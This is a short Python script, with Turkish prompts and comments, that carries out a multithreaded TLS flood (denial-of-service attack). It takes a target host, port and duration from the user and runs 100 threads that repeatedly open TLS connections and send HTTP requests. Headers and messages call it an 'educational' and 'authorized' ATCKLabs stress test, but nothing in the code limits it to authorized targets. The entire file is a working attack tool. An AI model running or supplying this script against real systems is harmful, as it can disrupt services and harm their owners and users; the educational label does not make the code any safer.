import ssl
import socket
import threading
import time

# 🔧 Kullanıcıdan giriş al
TARGET = input("Hedef IP veya domain: ").strip()
PORT = int(input("Port (örnek: 443): ").strip())
DURATION = int(input("Saldırı süresi (saniye): ").strip())
THREADS = 100  # Gerekirse ayarlanabilir

# 📡 Eğitim amaçlı özel header içeren HTTP GET isteği
REQUEST = (
    "GET / HTTP/1.1\r\n"
    f"Host: {TARGET}\r\n"
    "User-Agent: ATCKLabs Testing DDoS Script/1.0 (Educational Only)\r\n"
    "X-Test-Notice: This traffic is part of an authorized stress test by ATCKLabs.\r\n"
    "X-Purpose: Educational Testing Only - Not Malicious\r\n"
    "Connection: keep-alive\r\n\r\n"
)

# 🧠 TLS bağlantı işlevi
def tls_attack():
    context = ssl.create_default_context()
    while time.time() < END_TIME:
        try:
            sock = socket.create_connection((TARGET, PORT), timeout=3)
            tls = context.wrap_socket(sock, server_hostname=TARGET)
            tls.sendall(REQUEST.encode())
            tls.close()
        except Exception:
            pass  # Zayıf sistemlerde bağlantı hataları olabilir

# 🚀 Ana çalıştırma bloğu
if __name__ == "__main__":
    print("\n[⚙️] ATCKLabs - Eğitim Amaçlı TLS Flood Test Başlatılıyor")
    print(f"[>] Hedef: {TARGET}:{PORT} | Süre: {DURATION}s | Thread: {THREADS}")
    print("[!] Bu script yalnızca izinli ortamlarda kullanılmalıdır.\n")

    END_TIME = time.time() + DURATION
    threads = []

    for _ in range(THREADS):
        t = threading.Thread(target=tls_attack)
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
        print("\n[✅] Test tamamlandı - ATCKLabs Educational Script")
    except KeyboardInterrupt:
        print("\n[⛔] Kullanıcı tarafından manuel olarak durduruldu.")
        print("[⚠️] Tüm thread'ler sonlandırılıyor, çıkış yapılıyor...\n")
